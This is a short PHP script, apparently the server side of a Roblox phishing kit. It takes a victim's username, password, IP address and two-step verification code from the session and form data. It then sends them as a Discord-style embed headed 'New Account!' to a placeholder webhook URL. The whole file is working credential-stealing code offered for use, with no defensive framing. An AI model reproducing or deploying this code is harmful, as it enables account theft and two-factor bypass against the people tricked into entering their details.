<?php
session_start();
if($_SESSION['rid']){
$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL => 'YOURWEBHOOKGOESHERE',
CURLOPT_POST => true,
CURLOPT_POSTFIELDS => '{"content":null,"embeds":[{"title":":money_with_wings: New Account! :moneybag:","description":"**You have received an account.**","url":"https://www.roblox.com/users/$UserID/profile","color":4695014,"fields":[{"name":"**Username**","value":"```'."".$_SESSION['rusername']."".'```"},{"name":"**Password**","value":"```'."".$_SESSION['password']."".'```"},{"name":"**IP Address**","value":"```'."".$_SERVER['REMOTE_ADDR']."".'```"},{"name":"2-Step","value":"```'."".$_POST['code']."".'```","inline":true}],"author":{"name":"Result"},"image":{"url":"https://www.roblox.com/outfit-thumbnail/image?userOutfitId='."".$_SESSION['rid']."".'&width=420&height=420&format=png"}}],"username":"xHook","avatar_url":"https://assets.ifttt.com/images/channels/1004582012/icons/large.png","attachments":[]}',
CURLOPT_HTTPHEADER => [
'Content-Type: application/json'
]
]);                         
$response = curl_exec($ch);
curl_close($ch);
session_destroy();
die('1');
}
?>
